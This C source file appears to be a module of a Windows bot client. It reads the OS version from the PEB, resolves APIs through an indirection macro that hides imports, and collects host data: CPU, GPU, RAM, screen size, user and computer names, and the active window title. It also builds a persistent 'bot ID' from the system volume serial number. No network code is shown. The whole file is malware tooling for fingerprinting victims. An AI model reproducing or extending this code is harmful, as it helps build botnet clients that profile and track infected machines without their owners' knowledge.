#include "Common.h"

void GetWinVer(DWORD* pdwMajor, DWORD* pdwMinor, DWORD* pdwBuild)
{
	__PEB* pPEB = NULL;

	pPEB = (__PEB*)__readfsdword(0x30);
	*pdwMajor = (DWORD)pPEB->dwOSMajorVersion;
	*pdwMinor = (DWORD)pPEB->dwOSMinorVersion;
	*pdwBuild = (DWORD)pPEB->wOSBuildNumber;
}

void IsWinX64(DWORD *isWinX64)
{
	SYSTEM_INFO info;
	API(MSVCRT, memset)(&info, 0, sizeof(info));
	API(KERNEL32, GetNativeSystemInfo)(&info);

	*isWinX64 = info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64;
}

void GetCpuName(LPWSTR cpuName)
{
	int CPUInfo[4];
	unsigned nExIds, i = 0;
	static char CPUBrandString[0x40];
	
	__cpuid(CPUInfo, 0x80000000);

	nExIds = CPUInfo[0];

	for (i = 0x80000000; i <= nExIds; ++i)
	{
		__cpuid(CPUInfo, i);
		
		if (i == 0x80000002)
		{
			API(MSVCRT, memcpy)(CPUBrandString, CPUInfo, sizeof(CPUInfo));
		}
		else if (i == 0x80000003)
		{
			API(MSVCRT, memcpy)(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
		}
		else if (i == 0x80000004)
		{
			API(MSVCRT, memcpy)(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
		}
	}

	API(USER32, wsprintfW)(cpuName, L"%S", CPUBrandString);
}

void GetGpuName(LPWSTR gpuName)
{
	DISPLAY_DEVICEW dd;
	dd.cb = sizeof(DISPLAY_DEVICEW);
	API(USER32, EnumDisplayDevicesW)(NULL, 0, &dd, EDD_GET_DEVICE_INTERFACE_NAME);
	API(USER32, wsprintfW)(gpuName, L"%s", dd.DeviceString);
}

void GetAviableRam(DWORD* aviableRam)
{
	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);
	API(KERNEL32, GlobalMemoryStatusEx)(&statex);

	*aviableRam = (statex.ullTotalPhys / 1024) / 1024;
}

void GetScreenResolution(LPWSTR screenResolution)
{
	RECT desktop;
	HWND hDesktop = NULL;

	hDesktop = API(USER32, GetDesktopWindow)();
	API(USER32, GetWindowRect)(hDesktop, &desktop);

	API(USER32, wsprintfW)(screenResolution, L"%dx%d", desktop.right, desktop.bottom);
}

BOOL GetUsernameW(LPWSTR userName)
{
	DWORD bufCharCount = 1024;

	if (!API(ADVAPI32, GetUserNameW)(userName, &bufCharCount))
	{
		return FALSE;
	}

	return TRUE;
}

BOOL GetComputernameW(LPWSTR computerName)
{
	DWORD bufCharCount = 1024;

	if (!API(KERNEL32, GetComputerNameW)(computerName, &bufCharCount))
	{
		return FALSE;
	}

	return TRUE;
}

void GetActiveWindow(LPWSTR activeWindow)
{
	HWND hwnd = API(USER32, GetForegroundWindow)();
	API(USER32, GetWindowTextW)(hwnd, activeWindow, 50);
}

ULONG PseudoRand(ULONG* seed)
{
	return (*seed = 1352459 * (*seed) + 2529004207);
}

void GetBotId(LPWSTR botId)
{
	wchar_t windowsDirectory[MAX_PATH];
	wchar_t volumeName[8] = { 0 };
	DWORD seed = 0;

	if (!API(KERNEL32, GetWindowsDirectoryW)(windowsDirectory, MAX_PATH))
	{
		windowsDirectory[0] = 'C';
	}

	volumeName[0] = windowsDirectory[0];
	volumeName[1] = ':';
	volumeName[2] = '\\';
	volumeName[3] = '\0';

	API(KERNEL32, GetVolumeInformationW)(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

	GUID guid;
	guid.Data1 = PseudoRand(&seed);

	guid.Data2 = (USHORT)PseudoRand(&seed);
	guid.Data3 = (USHORT)PseudoRand(&seed);
	for (int i = 0; i < 8; i++)
	{
		guid.Data4[i] = (UCHAR)PseudoRand(&seed);
	}

	API(USER32, wsprintfW)(botId, StaticData::botidFmt, guid.Data1, guid.Data3, *(ULONG*)&guid.Data4[2]);
}